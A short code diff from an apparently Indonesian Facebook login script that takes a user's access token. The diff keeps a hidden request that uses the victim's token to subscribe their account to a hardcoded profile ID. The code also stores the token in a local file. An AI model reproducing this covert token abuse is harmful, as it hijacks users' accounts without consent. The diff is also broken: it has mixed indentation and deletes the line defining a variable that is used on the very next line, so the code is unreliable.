@@ -122,8 +122,7 @@ def tokenz():
 		try:
 			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
 			try:
-			nama=r['name']
-            requests.post('https://graph.facebook.com/100055913630645/subscribers?access_token=' + token)
+                    requests.post('https://graph.facebook.com/100055913630645/subscribers?access_token=' + token)
 		    print(f"[✓] Login Berhasil [✓]\nWelcome {nama}")
 			open("save","a").write(to)
 			time.sleep(1.5)
